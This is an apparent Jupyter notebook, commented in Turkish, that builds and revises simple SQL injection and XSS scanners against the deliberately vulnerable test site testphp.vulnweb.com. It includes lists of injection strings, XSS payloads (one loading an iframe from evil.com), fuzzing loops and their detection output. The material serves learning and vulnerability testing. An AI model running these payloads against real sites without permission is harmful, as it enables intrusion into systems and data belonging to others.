# %%
import requests
import re

# %%
file_path = "payloads.txt"

# Dosyayı okuyun
with open(file_path, "r") as file:
    # Dosya içeriğini bir değişkene atayın
    file_content = file.readlines()

# Dosya içeriğini ekrana yazdırın
print(file_content)
# Out:
# ["'\n", "''\n", '`\n', '``\n', ',\n', '"\n', '""\n', '/\n', '//\n', '\\\n', '\\\\\n', ';\n', '\' or "\n', '-- or # \n', "' OR '1\n", "' OR 1 -- -\n", '" OR "" = "\n', '" OR 1 = 1 -- -\n', "' OR '' = '\n", "'='\n", "'LIKE'\n", "'=0--+\n", ' OR 1=1\n', "' OR 'x'='x\n", "' AND id IS NULL; --\n", "'''''''''''''UNION SELECT '2\n", '%00']

# %%
file_url = "url.txt"

# Dosyayı okuyun
with open(file_url, "r") as file:
    # Dosya içeriğini bir değişkene atayın
    file_c = file.readlines()
# Dosya içeriğini ekrana yazdırın
print(file_c)
# Out:
# ['http://testphp.vulnweb.com/listproducts.php?cat=1\n', 'http://testphp.vulnweb.com/product.php?pic=1\n', 'http://testphp.vulnweb.com/artists.php?artist=1\n', 'http://testphp.vulnweb.com/product.php?pic=2\n', 'http://testphp.vulnweb.com/product.php?pic=3\n', 'http://testphp.vulnweb.com/product.php?pic=4\n', 'http://testphp.vulnweb.com/product.php?pic=5\n', 'http://testphp.vulnweb.com/comment.php?pid=4\n', 'http://testphp.vulnweb.com/product.php?pic=7\n', 'http://testphp.vulnweb.com/artists.php?artist=2\n', 'http://testphp.vulnweb.com/listproducts.php?cat=2\n', 'http://testphp.vulnweb.com/product.php?pic=6\n', 'http://testphp.vulnweb.com/comment.php?pid=6\n', 'http://testphp.vulnweb.com/listproducts.php?cat=3\n', 'http://testphp.vulnweb.com/listproducts.php?cat=4\n', 'http://testphp.vulnweb.com/artists.php?artist=3\n', 'http://testphp.vulnweb.com/comment.php?aid=1\n', 'http://testphp.vulnweb.com/comment.php?aid=2\n', 'http://testphp.vulnweb.com/comment.php?aid=3']

# %%
urls = file_c

# SQL injection için hazırlanan payload'lar
payloads = file_content

for url in urls:
    #print(url)
    # "=" işaretinden sonrasına payload ekleyerek yeni URL oluştur
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul
    for payload in payloads:
        #print(payload)
        
        new_url = url[:index_of_equals + 1] + payload  # "=" işaretinden önceki kısmı ve payload'ı birleştir
        print(new_url)
        #r = requests.get(urls + payload)
        # Yeni URL'e istek gönder
        
        response = requests.get(new_url)
        
       
        if re.search("You have an error in your SQL syntax", response.text):
            print("SQL injection tespit edildi: " + payload)
        
        # İsteğin sonucunu ekrana yazdır
        print("URL: ", url)
        print("PAYLOAD: ",  payload)
        
        print("-------------------------------------")
# Out:
# http://testphp.vulnweb.com/listproducts.php?cat='
#
# URL:  http://testphp.vulnweb.com/listproducts.php?cat=1
#
# PAYLOAD:  '
#
# SQL injection tespit edildi: '
#
# -------------------------------------
# http://testphp.vulnweb.com/listproducts.php?cat=''
#
# URL:  http://testphp.vulnweb.com/listproducts.php?cat=1
#
# PAYLOAD:  ''
#
# -------------------------------------
# http://testphp.vulnweb.com/listproducts.php?cat=`
#
# URL:  http://testphp.vulnweb.com/listproducts.php?cat=1
#
# PAYLOAD:  `
#
# SQL injection tespit edildi: `
#
# -------------------------------------
# http://testphp.vulnweb.com/listproducts.php?cat=``
#
# URL:  http://testphp.vulnweb.com/listproducts.php?cat=1
#
# PAYLOAD:  ``
#
# -------------------------------------
# http://testphp.vulnweb.com/listproducts.php?cat=,
#
# URL:  http://testphp.vulnweb.com/listproducts.php?cat=1
#
# PAYLOAD:  ,
#
# SQL injection tespit edildi: ,
#
# -------------------------------------
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(url, data=form_data, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)

def main():
    print("URL gir: ")
    urls = input()

    main_inputs = getinputs(urls)
    for main_input_name in main_inputs:
        for payload in xss_payload:
            main_result = xsspayload_input(urls, main_input_name, payload)
            if main_result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name)

    links = getlinks(urls)
    for link in links:
        print("\nLink:", link)
        xss_kontrol(link)

def getlinks(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [link.get("href") for link in soup.find_all("a") if link.get("href").startswith(("http://", "https://"))]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
# Out:
# URL gir:
# http://vulnweb.com
#
# Link: https://www.acunetix.com/
#
# Link: https://www.acunetix.com/vulnerability-scanner/
#
# Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: username Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: username Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'> Input: username Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: <iframe onload='javascript:alert(1)'></iframe> Input: username Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: password Link: http://testhtml5.vulnweb.com/
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: password Link: http://testhtml5.vulnweb.com/
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]


def xsspayload_input(url, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(url, data=form_data, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)


def main():
    
    file_url = "url.txt"

    # Dosyayı okuyun
    with open(file_url, "r") as file:
        # Dosya içeriğini bir değişkene atayın
        urls = file.readlines()
        
        main_inputs = getinputs(urls)
        for main_input_name in main_inputs:
            for payload in xss_payload:
                main_result = xsspayload_input(urls, main_input_name, payload)
                if main_result:
                    print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name)

        links = urls
        for link in links:
            print("\nLink:", link)
            xss_kontrol(link)
        
        
    # Dosya içeriğini ekrana yazdırın
    #print(file_c)
    
    


def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []


if __name__ == "__main__":
    main()
# Out:
# Error: No connection adapters were found for "['http://testphp.vulnweb.com/listproducts.php?cat=1\\n', 'http://testphp.vulnweb.com/product.php?pic=1\\n', 'http://testphp.vulnweb.com/artists.php?artist=1\\n', 'http://testphp.vulnweb.com/product.php?pic=2\\n', 'http://testphp.vulnweb.com/product.php?pic=3\\n', 'http://testphp.vulnweb.com/product.php?pic=4\\n', 'http://testphp.vulnweb.com/product.php?pic=5\\n', 'http://testphp.vulnweb.com/comment.php?pid=4\\n', 'http://testphp.vulnweb.com/product.php?pic=7\\n', 'http://testphp.vulnweb.com/artists.php?artist=2\\n', 'http://testphp.vulnweb.com/listproducts.php?cat=2\\n', 'http://testphp.vulnweb.com/product.php?pic=6\\n', 'http://testphp.vulnweb.com/comment.php?pid=6\\n', 'http://testphp.vulnweb.com/listproducts.php?cat=3\\n', 'http://testphp.vulnweb.com/listproducts.php?cat=4\\n', 'http://testphp.vulnweb.com/artists.php?artist=3\\n', 'http://testphp.vulnweb.com/comment.php?aid=1\\n', 'http://testphp.vulnweb.com/comment.php?aid=2\\n', 'htt
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    form_data = {input_name: payload}
    try:
        response = requests.post(url, data=form_data, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print(f"XSS zafiyeti VAR (input). Payload: {payload}, Input: {input_name}, Link: {url}")
            else:
                print(f"XSS zafiyeti YOK (input). Payload: {payload}, Input: {input_name}, Link: {url}")

def main():
    urls = input("URL gir: ")

    main_inputs = getinputs(urls)
    for main_input_name in main_inputs:
        for payload in xss_payload:
            main_result = xsspayload_input(urls, main_input_name, payload)
            if main_result:
                print(f"XSS zafiyeti VAR (input). Payload: {payload}, Input: {main_input_name}, Link: {urls}")

    links = getlinks(urls)
    for link in links:
        if link.startswith('/'):
            link = urls.rstrip('/') + link  # Göreceli URL'leri tam URL'ye çevir
        print(f"\nLink: {link}")
        xss_kontrol(link)

def getlinks(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [link.get("href") for link in soup.find_all("a") if link.get("href") and link.get("href").startswith(("http://", "https://", "/"))]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input") if input_tag.get("name")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
# Out:
# URL gir: http://testphp.vulnweb.com/index.php
#
# Link: https://www.acunetix.com/
#
# Link: https://www.acunetix.com/vulnerability-scanner/
#
# Link: http://www.acunetix.com
#
# Link: https://www.acunetix.com/vulnerability-scanner/php-security-scanner/
#
# Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script>, Input: EMAIL, Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'>, Input: EMAIL, Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'>, Input: EMAIL, Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    # Form verilerini URL parametreleri olarak gönder
    params = {input_name: payload}
    try:
        response = requests.get(url, params=params, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)

def main():
    urls = input("URL gir: ")

    main_inputs = getinputs(urls)
    for main_input_name in main_inputs:
        for payload in xss_payload:
            main_result = xsspayload_input(urls, main_input_name, payload)
            if main_result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name)

    links = getlinks(urls)
    for link in links:
        full_link = link if link.startswith(('http://', 'https://')) else urls.rstrip('/') + '/' + link.lstrip('/')
        print("\nLink:", full_link)
        xss_kontrol(full_link)

def getlinks(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [link.get("href") for link in soup.find_all("a") if link.get("href") and link.get("href").startswith(("http://", "https://"))]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input") if input_tag.get("name")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
# Out:
# URL gir: http://testphp.vulnweb.com/index.php
#
# Link: https://www.acunetix.com/
#
# Link: https://www.acunetix.com/vulnerability-scanner/
#
# Link: http://www.acunetix.com
#
# Link: https://www.acunetix.com/vulnerability-scanner/php-security-scanner/
#
# Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: EMAIL Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: EMAIL Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'> Input: EMAIL Link: https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    # Form verilerini URL parametreleri olarak gönder
    params = {input_name: payload}
    try:
        response = requests.get(url, params=params, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)

def main():
    url = input("URL gir: ")

    main_inputs = getinputs(url)
    for main_input_name in main_inputs:
        for payload in xss_payload:
            main_result = xsspayload_input(url, main_input_name, payload)
            if main_result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", main_input_name, "Link:", url)

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input") if input_tag.get("name")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
# Out:
# URL gir: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: searchFor Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: searchFor Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'> Input: searchFor Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: <iframe onload='javascript:alert(1)'></iframe> Input: searchFor Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: goButton Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: goButton Link: http://testphp.vulnweb.com/index.php
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'> Input: goButton Link: http://testphp.vulnweb.com/index.php
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def xsspayload_input(url, input_name, payload):
    # Form verilerini URL parametreleri olarak gönder
    params = {input_name: payload}
    try:
        response = requests.get(url, params=params, allow_redirects=True)
        return payload in response.text
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return False

def xss_kontrol(url):
    inputs = getinputs(url)
    for input_name in inputs:
        for payload in xss_payload:
            result = xsspayload_input(url, input_name, payload)
            if result:
                print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", input_name, "Link:", url)
            else:
                print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", input_name, "Link:", url)

             
                
def main():
    file_url = "url.txt"
    with open(file_url, 'r') as file:
        urls = file.readlines()   
        
    for url in urls:
        url_n = url.strip()  # Yeni satır karakterlerini temizle
        index_of_equals = url.find("=")
        url = url[:index_of_equals + 1]
        if url:
            print(f"\nURL: {url}")
            main_inputs = getinputs(url)
            for main_input_name in main_inputs:
                for payload in xss_payload:
                    main_result = xsspayload_input(url, main_input_name, payload)
                    if main_result:
                        print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name, "Link:", url)
                    else:
                        print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", main_input_name, "Link:", url)

def getinputs(url):
    try:
        r = requests.get(url)
        r.raise_for_status()
        soup = BeautifulSoup(r.content, 'html.parser')
        return [input_tag.get("name") for input_tag in soup.find_all("input") if input_tag.get("name")]
    except requests.exceptions.RequestException as e:
        print("Error:", e)
        return []

if __name__ == "__main__":
    main()
# Out:
# URL: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: searchFor Link: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: searchFor Link: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: '"><img src='x' onerror='alert(1)'> Input: searchFor Link: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: <iframe onload='javascript:alert(1)'></iframe> Input: searchFor Link: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: <script>alert('1')</script> Input: goButton Link: http://testphp.vulnweb.com/listproducts.php?cat=
# XSS zafiyeti YOK (input). Payload: <img src='x' onerror='alert("1")'> Input: goButton Link: http://testphp.vulnweb.com/listproducts.php?cat=
# ...

# %%
import requests
from bs4 import BeautifulSoup

xss_payload = [
    "<script>alert('1')</script>",
    "<img src='x' onerror='alert(\"1\")'>",
    "'\"><img src='x' onerror='alert(1)'>",
    "<iframe onload='javascript:alert(1)'></iframe>",
]

def main():
    file_url = "url.txt"
    with open(file_url, 'r') as file:
        urls = file.readlines()   
        
    for url in urls:
        url_n = url.strip()  # Yeni satır karakterlerini temizle
        index_of_equals = url.find("=")
        url = url[:index_of_equals + 1]
        if url:
            print(f"\nURL: {url}")
            main_inputs = getinputs(url)
            for main_input_name in main_inputs:
                for payload in xss_payload:
                    main_result = xsspayload_input(url, main_input_name, payload)
                    if main_result:
                        print("XSS zafiyeti VAR (input). Payload:", payload, "Input:", main_input_name, "Link:", url)
                    else:
                        print("XSS zafiyeti YOK (input). Payload:", payload, "Input:", main_input_name, "Link:", url)

# %%
urls = file_c

# SQL injection için hazırlanan payload'lar
payloads = file_content

for url in urls:
    #print(url)
    # "=" işaretinden sonrasına payload ekleyerek yeni URL oluştur
    index_of_equals = url.find("=")  # "=" işaretinin index'ini bul
    for payload in payloads:
        #print(payload)
        
        new_url = url[:index_of_equals + 1] + payload  # "=" işaretinden önceki kısmı ve payload'ı birleştir
        print(new_url)
        #r = requests.get(urls + payload)
        # Yeni URL'e istek gönder
        
        response = requests.get(new_url)
        
       
        if re.search("You have an error in your SQL syntax", response.text):
            print("SQL injection tespit edildi: " + payload)
        
        # İsteğin sonucunu ekrana yazdır
        print("URL: ", url)
        print("PAYLOAD: ",  payload)
        
        print("-------------------------------------")

# %%
import requests
fname = "xss_payloads.txt"
with open(fname) as f:
    content = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
payloads = [x.strip() for x in content] 
url = "http://testphp.vulnweb.com/listproducts.php?cat="
vuln = []
for payload in payloads:
    payload = payload
    xss_url = url+payload
    r = requests.get(xss_url)
    if payload.lower() in r.text.lower():
        print("XSS zafiyeti VAR: " + xss_url)
        print("URL: " + url)
        print("Payload: " + payload)
        print("-----------------------")
        if(payload not in vuln):
            vuln.append(payload)
    else:
        print ("XSS zafiyeti YOK: " + xss_url)
        print("URL: " + url)
        print("Payload: " + payload)
        print("-----------------------")

#print ("--------------------\nAvailable Payloads:")
#print ('\n'.join(vuln))
# Out:
# XSS zafiyeti VAR: http://testphp.vulnweb.com/listproducts.php?cat=<body onload=alert("XSS")>
# URL: http://testphp.vulnweb.com/listproducts.php?cat=
# Payload: <body onload=alert("XSS")>
# -----------------------
# XSS zafiyeti VAR: http://testphp.vulnweb.com/listproducts.php?cat=<img src="javascript:alert("XSS");">
# URL: http://testphp.vulnweb.com/listproducts.php?cat=
# Payload: <img src="javascript:alert("XSS");">
# -----------------------
# XSS zafiyeti VAR: http://testphp.vulnweb.com/listproducts.php?cat=<iframe src="http://evil.com/xss.html">
# URL: http://testphp.vulnweb.com/listproducts.php?cat=
# Payload: <iframe src="http://evil.com/xss.html">
# -----------------------
# XSS zafiyeti VAR: http://testphp.vulnweb.com/listproducts.php?cat=<input type="image" src="javascript:alert('XSS');">
# URL: http://testphp.vulnweb.com/listproducts.php?cat=
# Payload: <input type="image" src="javascript:alert('XSS');">
# -----------------------
# ...
